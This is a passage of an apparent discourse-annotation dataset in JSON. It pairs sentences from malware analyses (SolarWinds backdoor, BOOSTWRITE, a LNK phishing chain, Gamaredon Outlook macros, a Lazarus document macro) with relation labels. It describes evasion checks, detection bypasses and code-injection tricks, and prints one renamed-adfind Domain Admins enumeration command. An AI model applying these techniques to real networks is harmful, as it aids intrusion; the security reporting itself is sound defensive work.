        "S2": "- It verifies that the process hosting the malicious DLL is named solarwinds.businesslayerhost.exe",
        "relation": "NEXT"
    },
    {
        "S1": "- It verifies that the process hosting the malicious DLL is named solarwinds.businesslayerhost.exe",
        "S2": "- It checks that the last write-time of the malicious DLL is at least 12 to 14 days earlier",
        "relation": "NEXT"
    },
    {
        "S1": "- It checks that the last write-time of the malicious DLL is at least 12 to 14 days earlier",
        "S2": "- It delays execution by random amounts of time",
        "relation": "NEXT"
    },
    {
        "S1": "- It delays execution by random amounts of time",
        "S2": "- It verifies that the domain name of the current device meets the following conditions:",
        "relation": "NEXT"
    },
    {
        "S1": "- It verifies that the domain name of the current device meets the following conditions:",
        "S2": "- The domain must not contain certain strings; the check for these strings is implemented via hashes, so at this time the domain names that are block-listed are unknown",
        "relation": "NEXT"
    },
    {
        "S1": "- The domain must not contain certain strings; the check for these strings is implemented via hashes, so at this time the domain names that are block-listed are unknown",
        "S2": "- The domain must not contain \u201csolarwinds\u201d",
        "relation": "NEXT"
    },
    {
        "S1": "- The domain must not contain \u201csolarwinds\u201d",
        "S2": "- The domain must not match the regular expression (?i)([^a-z]|^)(test)([^a-z]|$), or in simpler terms, it must not look like a test domain",
        "relation": "NEXT"
    },
    {
        "S1": "- The domain must not match the regular expression (?i)([^a-z]|^)(test)([^a-z]|$), or in simpler terms, it must not look like a test domain",
        "S2": "- It checks that there are no running processes related to security-related software (e.g., Windbg, Autoruns, Wireshark)",
        "relation": "NEXT"
    },
    {
        "S1": "- It checks that there are no running processes related to security-related software (e.g., Windbg, Autoruns, Wireshark)",
        "S2": "- It checks that there are no drivers loaded from security-related software (e.g., groundling32.sys)",
        "relation": "NEXT"
    },
    {
        "S1": "- It checks that there are no drivers loaded from security-related software (e.g., groundling32.sys)",
        "S2": "- It checks that the status of certain services belonging to security-related software meets certain conditions (e.g., windefend, sense, cavp)",
        "relation": "NEXT"
    },
    {
        "S1": "- It checks that the status of certain services belonging to security-related software meets certain conditions (e.g., windefend, sense, cavp)",
        "S2": "- It checks that the host \u201capi.solarwinds.com\u201d resolves to an expected IP address",
        "relation": "NEXT"
    },
    {
        "S1": "- It checks that the host \u201capi.solarwinds.com\u201d resolves to an expected IP address",
        "S2": "If any of these checks fail, the backdoor terminates.",
        "relation": "NEXT"
    },
    {
        "S1": "If any of these checks fail, the backdoor terminates.",
        "S2": "All these inspections are carried out to avoid exposing the malicious functionality to unwanted environments, such as test networks or machines belonging to SolarWinds.",
        "relation": "ELABORATION"
    },
    {
        "S1": "All these inspections are carried out to avoid exposing the malicious functionality to unwanted environments, such as test networks or machines belonging to SolarWinds.",
        "S2": "After the extensive validation described above, the backdoor enters its main execution stage.",
        "relation": "NEXT"
    },
    {
        "S1": "After the extensive validation described above, the backdoor enters its main execution stage.",
        "S2": "At its core, the backdoor is a very standard one that receives instructions from the C2 server, executes those instructions, and sends back information.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At its core, the backdoor is a very standard one that receives instructions from the C2 server, executes those instructions, and sends back information.",
        "S2": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it\u2019s executing from a trusted, signed binary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it\u2019s executing from a trusted, signed binary.",
        "S2": "In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.",
        "S2": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "S2": "This means that every affected device generates a different subdomain to contact (and possibly more than one).",
        "relation": "ELABORATION"
    },
    {
        "S1": "This means that every affected device generates a different subdomain to contact (and possibly more than one).",
        "S2": "Here\u2019s an example of a generated domain:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here\u2019s an example of a generated domain:",
        "S2": "The dynamically generated portion of the domain is the interesting part.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The dynamically generated portion of the domain is the interesting part.",
        "S2": "It is computed by hashing the following data:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is computed by hashing the following data:",
        "S2": "- The physical address of the network interface",
        "relation": "ELABORATION"
    },
    {
        "S1": "- The physical address of the network interface",
        "S2": "- The domain name of the device",
        "relation": "LIST"
    },
    {
        "S1": "- The domain name of the device",
        "S2": "- The content of the MachineGuid registry value from the key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography",
        "relation": "LIST"
    },
    {
        "S1": "- The content of the MachineGuid registry value from the key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography",
        "S2": "The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
        "relation": "MISC"
    },
    {
        "S1": "The backdoor also generates a pseudo-random URI that is requested on the C2 domain.",
        "S2": "Like the domain, the URI is composed using a set of hardcoded keywords and paths, which are chosen partly at random and partly based on the type of HTTP request that is being sent out.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Like the domain, the URI is composed using a set of hardcoded keywords and paths, which are chosen partly at random and partly based on the type of HTTP request that is being sent out.",
        "S2": "Possible URIs that can be generated follow these formats:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Possible URIs that can be generated follow these formats:",
        "S2": "Here are examples of final URLs generated by the backdoor:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here are examples of final URLs generated by the backdoor:",
        "S2": "Finally, the backdoor composes a JSON document into which it adds the unique user ID described earlier, a session ID, and a set of other non-relevant data fields.",
        "relation": "MISC"
    },
    {
        "S1": "Finally, the backdoor composes a JSON document into which it adds the unique user ID described earlier, a session ID, and a set of other non-relevant data fields.",
        "S2": "It then sends this JSON document to the C2 server.",
        "relation": "NEXT"
    },
    {
        "S1": "It then sends this JSON document to the C2 server.",
        "S2": "If the communication is successful, the C2 responds with an encoded, compressed buffer of data containing commands for the backdoor to execute.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the communication is successful, the C2 responds with an encoded, compressed buffer of data containing commands for the backdoor to execute.",
        "S2": "The C2 might also respond with information about an additional C2 address to report to.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The C2 might also respond with information about an additional C2 address to report to.",
        "S2": "The backdoor accepts the following commands:",
        "relation": "MISC"
    },
    {
        "S1": "The backdoor accepts the following commands:",
        "S2": "In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.",
        "S2": "The command CollectSystemDescription retrieves the following information:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The command CollectSystemDescription retrieves the following information:",
        "S2": "- Local Computer Domain name",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Local Computer Domain name",
        "S2": "- Administrator Account SID",
        "relation": "LIST"
    },
    {
        "S1": "- Administrator Account SID",
        "S2": "- HostName",
        "relation": "LIST"
    },
    {
        "S1": "- HostName",
        "S2": "- Username",
        "relation": "LIST"
    },
    {
        "S1": "- Username",
        "S2": "- OS Version",
        "relation": "LIST"
    },
    {
        "S1": "- OS Version",
        "S2": "- System Directory",
        "relation": "LIST"
    },
    {
        "S1": "- System Directory",
        "S2": "- Device uptime",
        "relation": "LIST"
    },
    {
        "S1": "- Device uptime",
        "S2": "- Information about the network interfaces",
        "relation": "LIST"
    },
    {
        "S1": "- Information about the network interfaces",
        "S2": "Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.",
        "relation": "MISC"
    },
    {
        "S1": "Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.",
        "S2": "To avoid detection, attackers renamed Windows administrative tools like adfind.exe which were then used for domain enumeration.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To avoid detection, attackers renamed Windows administrative tools like adfind.exe which were then used for domain enumeration.",
        "S2": "C:\\Windows\\system32\\cmd.exe /C csrss.exe -h breached.contoso.com -f (name=\u201dDomain Admins\u201d) member -list | csrss.exe -h breached.contoso.com -f objectcategory=* > .\\Mod\\mod1.log",
        "relation": "MISC"
    },
    {
        "S1": "C:\\Windows\\system32\\cmd.exe /C csrss.exe -h breached.contoso.com -f (name=\u201dDomain Admins\u201d) member -list | csrss.exe -h breached.contoso.com -f objectcategory=* > .\\Mod\\mod1.log",
        "S2": "Lateral movement was observed via PowerShell remote task creation, as detailed by FireEye and Volexity:",
        "relation": "MISC"
    },
    {
        "S1": "Lateral movement was observed via PowerShell remote task creation, as detailed by FireEye and Volexity:",
        "S2": "Persistence is achieved via backdoors deployed via various techniques:",
        "relation": "LIST"
    },
    {
        "S1": "Persistence is achieved via backdoors deployed via various techniques:",
        "S2": "The backdoor also allows the attackers to deliver second-stage payloads, which are part of the Cobalt Strike software suite.",
        "relation": "LIST"
    },
    {
        "S1": "The backdoor also allows the attackers to deliver second-stage payloads, which are part of the Cobalt Strike software suite.",
        "S2": "We continue to investigate these payloads, which are detected as Trojan:Win32/Solorigate.A!dha, as the situation continues to unfold.",
        "relation": "ELABORATION"
    },
    {
        "S1": "BOOSTWRITE is a loader crafted to be launched via abuse of the DLL search order of applications which load the legitimate \u2018Dwrite.dll\u2019 provided by the Microsoft DirectX Typography Services.",
        "S2": "The application loads the \u2018gdi\u2019 library, which loads the \u2018gdiplus\u2019 library, which ultimately loads \u2018Dwrite\u2019.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The application loads the \u2018gdi\u2019 library, which loads the \u2018gdiplus\u2019 library, which ultimately loads \u2018Dwrite\u2019.",
        "S2": "Mandiant identified instances where BOOSTWRITE was placed on the file system alongside the RDFClient binary to force the application to import DWriteCreateFactory from it rather than the legitimate DWrite.dll.",
        "relation": "MISC"
    },
    {
        "S1": "Mandiant identified instances where BOOSTWRITE was placed on the file system alongside the RDFClient binary to force the application to import DWriteCreateFactory from it rather than the legitimate DWrite.dll.",
        "S2": "Once loaded, `DWrite.dll` connects to a hard-coded IP and port from which it retrieves a decryption key and initialization vector (IV) to decrypt two embedded payload DLLs.",
        "relation": "NEXT"
    },
    {
        "S1": "Once loaded, `DWrite.dll` connects to a hard-coded IP and port from which it retrieves a decryption key and initialization vector (IV) to decrypt two embedded payload DLLs.",
        "S2": "To accomplish this task, the malware first generates a random file name to be used as a text log under the current user's %TEMP% directory; this filename starts with ~rdf and is followed by a set of random numbers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To accomplish this task, the malware first generates a random file name to be used as a text log under the current user's %TEMP% directory; this filename starts with ~rdf and is followed by a set of random numbers.",
        "S2": "Next, the malware scans its own image to find the location of a 32-byte long multi-XOR key which is used to decode data inside its body.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, the malware scans its own image to find the location of a 32-byte long multi-XOR key which is used to decode data inside its body.",
        "S2": "Part of the decoded data is an IP address and port which are used to retrieve the key and the IV for the decryption of the embedded payloads.",
        "relation": "NEXT"
    },
    {
        "S1": "Part of the decoded data is an IP address and port which are used to retrieve the key and the IV for the decryption of the embedded payloads.",
        "S2": "The encryption algorithm uses the ChaCha stream cipher with a 256-bit key and 64-bit IV.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The encryption algorithm uses the ChaCha stream cipher with a 256-bit key and 64-bit IV.",
        "S2": "Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the key and the IV are downloaded the malware decrypts the embedded payloads and performs sanity checks on the results.",
        "S2": "The payloads are expected to be PE32.DLLs which, if the tests pass, are loaded into memory without touching the filesystem.",
        "relation": "NEXT"
    },
    {
        "S1": "The payloads are expected to be PE32.DLLs which, if the tests pass, are loaded into memory without touching the filesystem.",
        "S2": "The malware logs various plaintext messages to the previously created logfile %TEMP%\\~rds<rnd_numbers> which are indicative of the loader\u2019s execution progress.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware logs various plaintext messages to the previously created logfile %TEMP%\\~rds<rnd_numbers> which are indicative of the loader\u2019s execution progress.",
        "S2": "An example of the file content is shown in Figure 1:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example of the file content is shown in Figure 1:",
        "S2": "Before exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method.",
        "relation": "MISC"
    },
    {
        "S1": "Before exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method.",
        "S2": "The malware decrypts and loads two payload DLLs.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware decrypts and loads two payload DLLs.",
        "S2": "One of the DLLs is an instance of the CARBANAK backdoor; the other DLL is a tool tracked by FireEye as RDFSNIFFER which allows an attacker to hijack instances of the NCR Aloha Command Center Client application and interact with victim systems via existing legitimate 2FA sessions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "One of the DLLs is an instance of the CARBANAK backdoor; the other DLL is a tool tracked by FireEye as RDFSNIFFER which allows an attacker to hijack instances of the NCR Aloha Command Center Client application and interact with victim systems via existing legitimate 2FA sessions.",
        "S2": "RDFSNIFFER is a module loaded by BOOSTWRITE which allows an attacker to monitor and tamper with legitimate connections made via NCR Corporation\u2019s \u2018Aloha Command Center Client\u2019 (RDFClient), an application designed to provide visibility and system management capabilities to remote IT techs.",
        "relation": "ELABORATION"
    },
    {
        "S1": "RDFSNIFFER is a module loaded by BOOSTWRITE which allows an attacker to monitor and tamper with legitimate connections made via NCR Corporation\u2019s \u2018Aloha Command Center Client\u2019 (RDFClient), an application designed to provide visibility and system management capabilities to remote IT techs.",
        "S2": "RDFSNIFFER loads into the same process as the legitimate RDFClient by abusing the utility\u2019s DLL load order, launching each time the \u2018Aloha Command Center Client\u2019 is executed on an impacted system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "RDFSNIFFER loads into the same process as the legitimate RDFClient by abusing the utility\u2019s DLL load order, launching each time the \u2018Aloha Command Center Client\u2019 is executed on an impacted system.",
        "S2": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1).",
        "relation": "NEXT"
    },
    {
        "S1": "When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-interface (Table 1).",
        "S2": "Furthermore, this enables the malware to alter the user\u2019s last input time to ensure application sessions do not time out.",
        "relation": "NEXT"
    },
    {
        "S1": "Furthermore, this enables the malware to alter the user\u2019s last input time to ensure application sessions do not time out.",
        "S2": "This module also contains a backdoor component that enables it to inject commands into an active RDFClient session.",
        "relation": "LIST"
    },
    {
        "S1": "This module also contains a backdoor component that enables it to inject commands into an active RDFClient session.",
        "S2": "This backdoor allows an attacker to upload, download, execute and/or delete arbitrary files (Table 2).",
        "relation": "LIST"
    },
    {
        "S1": "The threat actors used a malicious LNK file bundled within an archive file which was most likely distributed via spear-phishing.",
        "S2": "We were able to identify two variants of this campaign that possibly have been distributed between May 12th and 31st:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We were able to identify two variants of this campaign that possibly have been distributed between May 12th and 31st:",
        "S2": "Both RAR archives bundle two malicious LNK files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both RAR archives bundle two malicious LNK files.",
        "S2": "In the newer variant (CV_Colliers.rar), the LNK files are disguised as a Curriculum Vitae (CV) and International English Language Testing System (IELTS) exam results.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the newer variant (CV_Colliers.rar), the LNK files are disguised as a Curriculum Vitae (CV) and International English Language Testing System (IELTS) exam results.",
        "S2": "The older one (Project link and New copyright policy.rar) seems to target product teams that are using zeplin.io.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The older one (Project link and New copyright policy.rar) seems to target product teams that are using zeplin.io.",
        "S2": "The following shows the overall process flow when executing the malicious LNK file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following shows the overall process flow when executing the malicious LNK file.",
        "S2": "The LNK file contains a list of commands that will be executed upon running, and a blob that is a base64 encoded compressed payload.",
        "relation": "NEXT"
    },
    {
        "S1": "The LNK file contains a list of commands that will be executed upon running, and a blob that is a base64 encoded compressed payload.",
        "S2": "Here is the list of commands that will be executed:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Here is the list of commands that will be executed:",
        "S2": "- Copy content of the LNK file into \"g4ZokyumB2DC4.tmp\" in %APPDATA% temp directory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Copy content of the LNK file into \"g4ZokyumB2DC4.tmp\" in %APPDATA% temp directory.",
        "S2": "- Copy content of \"certutil.exe\" into \"gosia.exe\" ( \"*ertu*.exe is used to bypass security detection).",
        "relation": "NEXT"
    },
    {
        "S1": "- Copy content of \"certutil.exe\" into \"gosia.exe\" ( \"*ertu*.exe is used to bypass security detection).",
        "S2": "- Look for the base64 blob using \"findstr.exe\" and write it to \"cSi1rouy4.tmp\".",
        "relation": "NEXT"
    },
    {
        "S1": "- Look for the base64 blob using \"findstr.exe\" and write it to \"cSi1rouy4.tmp\".",
        "S2": "- Decode content of \"cSi1rouy4.tmp\" using \"gosia.exe -decode\" (certutil.exe -decode) and write it to \"o423DFDS4.tmp\".",
        "relation": "NEXT"
    },
    {
        "S1": "- Decode content of \"cSi1rouy4.tmp\" using \"gosia.exe -decode\" (certutil.exe -decode) and write it to \"o423DFDS4.tmp\".",
        "S2": "- Decompress content of \"o423DFDS4.tmp\" in temp directory along with a decoy PDF document using \"expand.exe -F:*\" (Figure 3) .",
        "relation": "NEXT"
    },
    {
        "S1": "- Decompress content of \"o423DFDS4.tmp\" in temp directory along with a decoy PDF document using \"expand.exe -F:*\" (Figure 3) .",
        "S2": "- Copy \"66DF3DFG.tmp\" and \"34fDKfSD38.js\" files into \"C:\\Users\\Public\\Downloads\" directory.",
        "relation": "NEXT"
    },
    {
        "S1": "- Copy \"66DF3DFG.tmp\" and \"34fDKfSD38.js\" files into \"C:\\Users\\Public\\Downloads\" directory.",
        "S2": "- Execute the JS file by calling Wscript.",
        "relation": "NEXT"
    },
    {
        "S1": "- Execute the JS file by calling Wscript.",
        "S2": "- Open the decoy document.",
        "relation": "NEXT"
    },
    {
        "S1": "- Open the decoy document.",
        "S2": "The list of commands executed by this LNK shortcut is the same as the one reported by Anomali on the Higasia Covid-19 campaign.",
        "relation": "MISC"
    },
    {
        "S1": "The list of commands executed by this LNK shortcut is the same as the one reported by Anomali on the Higasia Covid-19 campaign.",
        "S2": "The only difference is the name of the tmp files and name of certutil.exe which in this new case is \"gosia.exe\", while in the March campaign the name was \"mosia.exe\".",
        "relation": "ELABORATION"
    },
    {
        "S1": "The only difference is the name of the tmp files and name of certutil.exe which in this new case is \"gosia.exe\", while in the March campaign the name was \"mosia.exe\".",
        "S2": "Both LNK files embedded within the archive are executing similar commands with the different Command and Control (C&C) configurations.",
        "relation": "MISC"
    },
    {
        "S1": "Both LNK files embedded within the archive are executing similar commands with the different Command and Control (C&C) configurations.",
        "S2": "Running each of them would show a different decoy document.",
        "relation": "NEXT"
    },
    {
        "S1": "Running each of them would show a different decoy document.",
        "S2": "The JavaScript file performs the following commands:",
        "relation": "MISC"
    },
    {
        "S1": "The JavaScript file performs the following commands:",
        "S2": "- Create \"d3reEW.exe\" in \"C:\\Users\\Public\\Downloads\" and store \"cmd /c ipconfig\" in it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Create \"d3reEW.exe\" in \"C:\\Users\\Public\\Downloads\" and store \"cmd /c ipconfig\" in it.",
        "S2": "- Execute the dropped \"svchast.exe\".",
        "relation": "NEXT"
    },
    {
        "S1": "- Execute the dropped \"svchast.exe\".",
        "S2": "- Copy \"svchhast.exe\" into startup directory and rename it as \"officeupdate.exe\".",
        "relation": "NEXT"
    },
    {
        "S1": "- Copy \"svchhast.exe\" into startup directory and rename it as \"officeupdate.exe\".",
        "S2": "- Add \"officeupdate.exe\" to scheduled tasks.",
        "relation": "NEXT"
    },
    {
        "S1": "- Add \"officeupdate.exe\" to scheduled tasks.",
        "S2": "- Send a POST request to a hardcoded URL with \"d3reEW.exe\" as data.",
        "relation": "NEXT"
    },
    {
        "S1": "- Send a POST request to a hardcoded URL with \"d3reEW.exe\" as data.",
        "S2": "Svchast.exe is a small loader that loads the content of the shellcode stored in \"66DF3DFG.tmp\".",
        "relation": "MISC"
    },
    {
        "S1": "Svchast.exe is a small loader that loads the content of the shellcode stored in \"66DF3DFG.tmp\".",
        "S2": "In fact, this shellcode is a wrapper around the final shellcode.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In fact, this shellcode is a wrapper around the final shellcode.",
        "S2": "It performs some checks and then calls the final shellcode.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It performs some checks and then calls the final shellcode.",
        "S2": "The final shellcode dynamically resolves the imports and allocates memory for the content that will be executed.",
        "relation": "NEXT"
    },
    {
        "S1": "The final shellcode dynamically resolves the imports and allocates memory for the content that will be executed.",
        "S2": "Finally it calls \"CreateThread\" to create a thread within its memory space to make HTTPS requests to its C&C server.",
        "relation": "NEXT"
    },
    {
        "S1": "Finally it calls \"CreateThread\" to create a thread within its memory space to make HTTPS requests to its C&C server.",
        "S2": "At the time of analysis, the server was down so we weren't able to clearly identify the ultimate goal of this attack.",
        "relation": "MISC"
    },
    {
        "S1": "At the time of analysis, the server was down so we weren't able to clearly identify the ultimate goal of this attack.",
        "S2": "While most malware campaigns use a simple decoy document that typically retrieves a malware payload, more advanced attackers will often try unconventional means to infect their victims.",
        "relation": "MISC"
    },
    {
        "S1": "While most malware campaigns use a simple decoy document that typically retrieves a malware payload, more advanced attackers will often try unconventional means to infect their victims.",
        "S2": "We reproduced this attack in our lab using an email as the infection vector, as we surmise that victims were spear-phished.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We reproduced this attack in our lab using an email as the infection vector, as we surmise that victims were spear-phished.",
        "S2": "Malwarebytes (in this case the Nebula business version) stopped the LNK file execution from WinRAR and therefore completely stopped the attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Gamaredon group uses a package that includes a custom Microsoft Outlook Visual Basic for Applications (VBA) project.",
        "S2": "Using Outlook macros to deliver malware is something we rarely see while investigating malicious campaigns.",
        "relation": "NEXT"
    },
    {
        "S1": "Using Outlook macros to deliver malware is something we rarely see while investigating malicious campaigns.",
        "S2": "This bundle of malicious code starts out with a VBScript that first kills the Outlook process if it is running, and then removes security around VBA macro execution in Outlook by changing registry values.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This bundle of malicious code starts out with a VBScript that first kills the Outlook process if it is running, and then removes security around VBA macro execution in Outlook by changing registry values.",
        "S2": "It also saves to disk the malicious OTM file (Outlook VBA project) that contains a macro, the malicious email attachment and, in some cases, a list of recipients that the emails should be sent to.",
        "relation": "NEXT"
    },
    {
        "S1": "It also saves to disk the malicious OTM file (Outlook VBA project) that contains a macro, the malicious email attachment and, in some cases, a list of recipients that the emails should be sent to.",
        "S2": "Next, it relaunches Outlook with a special option, /altvba <OTM filename>, which loads the Gamaredon VBA project.",
        "relation": "NEXT"
    },
    {
        "S1": "Next, it relaunches Outlook with a special option, /altvba <OTM filename>, which loads the Gamaredon VBA project.",
        "S2": "The malicious code is executed once the Application.Startup event is received.",
        "relation": "NEXT"
    },
    {
        "S1": "The malicious code is executed once the Application.Startup event is received.",
        "S2": "They have been using this module in three different ways to send malicious email to:",
        "relation": "MISC"
    },
    {
        "S1": "They have been using this module in three different ways to send malicious email to:",
        "S2": "- Everyone in the victim\u2019s address book",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Everyone in the victim\u2019s address book",
        "S2": "- Everyone within the same organization",
        "relation": "LIST"
    },
    {
        "S1": "- Everyone within the same organization",
        "S2": "- A predefined list of targets",
        "relation": "LIST"
    },
    {
        "S1": "- A predefined list of targets",
        "S2": "While abusing a compromised mailbox to send malicious emails without the victim\u2019s consent is not a new technique, we believe this is the first publicly documented case of an attack group using an OTM file and Outlook macro to achieve it.",
        "relation": "MISC"
    },
    {
        "S1": "While abusing a compromised mailbox to send malicious emails without the victim\u2019s consent is not a new technique, we believe this is the first publicly documented case of an attack group using an OTM file and Outlook macro to achieve it.",
        "S2": "Based on the \u201csend to all in contact list\u201d behavior of this malicious VBA code, we believe that this module might have led some organizations to think they were targeted by Gamaredon when they were merely collateral damage.",
        "relation": "MISC"
    },
    {
        "S1": "Based on the \u201csend to all in contact list\u201d behavior of this malicious VBA code, we believe that this module might have led some organizations to think they were targeted by Gamaredon when they were merely collateral damage.",
        "S2": "For example, recent samples uploaded to VirusTotal coming from regions that are not traditionally targeted by Gamaredon, such as Japan, could be explained by the actions of this module.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For example, recent samples uploaded to VirusTotal coming from regions that are not traditionally targeted by Gamaredon, such as Japan, could be explained by the actions of this module.",
        "S2": "As seen in Figure 2, the VBA code builds the email body and attaches the malicious document to the email.",
        "relation": "MISC"
    },
    {
        "S1": "As seen in Figure 2, the VBA code builds the email body and attaches the malicious document to the email.",
        "S2": "We\u2019ve seen both .docx and .lnk files being used as attachments.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We\u2019ve seen both .docx and .lnk files being used as attachments.",
        "S2": "These are very similar to the content of the malicious attachments used in Gamaredon\u2019s initial spearphishing campaigns.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These are very similar to the content of the malicious attachments used in Gamaredon\u2019s initial spearphishing campaigns.",
        "S2": "Figure 3 shows an email generated by this malicious component.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Figure 3 shows an email generated by this malicious component.",
        "S2": "The email contains both English and Russian text.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The email contains both English and Russian text.",
        "S2": "However, as illustrated in Figure 3, there is a problem with the Russian encoding.",
        "relation": "ELABORATION"
    },
    {
        "S1": "However, as illustrated in Figure 3, there is a problem with the Russian encoding.",
        "S2": "This was fixed in a later version of this module \u2014 another example of the Gamaredon group\u2019s fast development pace and apparent lack of attention to detail.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We identified two phishing documents: \u201cLockheed_Martin_JobOpportunities.docx\u201d and \u201cSalary_Lockheed_Martin_job_opportunities_confidential.doc\u201d.",
        "S2": "Both variants were authored by the same user, named \u201cMickey\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both variants were authored by the same user, named \u201cMickey\u201d.",
        "S2": "The methodology used for control flow hijack and the macro content is similar across both samples.",
        "relation": "MISC"
    },
    {
        "S1": "The methodology used for control flow hijack and the macro content is similar across both samples.",
        "S2": "The macro uses aliases to rename the APIs that it uses (fig. 2).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The macro uses aliases to rename the APIs that it uses (fig. 2).",
        "S2": "The initial entry point for the macro is via the ActiveX Frame1_Layout to automatically execute once ActiveX control is enabled (fig. 3).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The initial entry point for the macro is via the ActiveX Frame1_Layout to automatically execute once ActiveX control is enabled (fig. 3).",
        "S2": "The macro starts by loading WMVCORE.DLL, which is a legitimate windows dll for windows media.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The macro starts by loading WMVCORE.DLL, which is a legitimate windows dll for windows media.",
        "S2": "Interestingly, to make the macro seem more innocuous, Lazarus uses function names identical to the exported functions of WMVCORE.DLL and variable names thematically related to playback (fig. 4).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Interestingly, to make the macro seem more innocuous, Lazarus uses function names identical to the exported functions of WMVCORE.DLL and variable names thematically related to playback (fig. 4).",
        "S2": "The macro uses a check for a document variable before entering its main functionality block.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The macro uses a check for a document variable before entering its main functionality block.",
        "S2": "This variable is set at the end to ensure that subsequent opening of the document does not execute it again.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This variable is set at the end to ensure that subsequent opening of the document does not execute it again.",
        "S2": "The second stage payload is shellcode that is embedded as a base64 encoded string array inside the macro that is decoded by using CryptStringToBinaryW (fig. 5).",
        "relation": "NEXT"
    },
    {
        "S1": "The second stage payload is shellcode that is embedded as a base64 encoded string array inside the macro that is decoded by using CryptStringToBinaryW (fig. 5).",
        "S2": "Other variants have used the UuidFromStringA function to decode the embedded payload and write it to an executable Heap.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Other variants have used the UuidFromStringA function to decode the embedded payload and write it to an executable Heap.",
        "S2": "The decoded shellcode then overwrites the WMIsAvailableOffline function from WMVCORE.dll by retrieving its address and changing its memory permissions.",
        "relation": "NEXT"
    },
    {
        "S1": "The decoded shellcode then overwrites the WMIsAvailableOffline function from WMVCORE.dll by retrieving its address and changing its memory permissions.",
        "S2": "The callback to the shellcode is achieved by retrieving the KernelCallbackTable pointer from the PEB structure of the current process via NtQueryInformationProcess, and then patching the _fnDWORD pointer to point to WMIsAvailableOffline.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The callback to the shellcode is achieved by retrieving the KernelCallbackTable pointer from the PEB structure of the current process via NtQueryInformationProcess, and then patching the _fnDWORD pointer to point to WMIsAvailableOffline.",
        "S2": "Whenever winword makes any graphical call, the shellcode executes.",
        "relation": "ELABORATION"
    },
    {
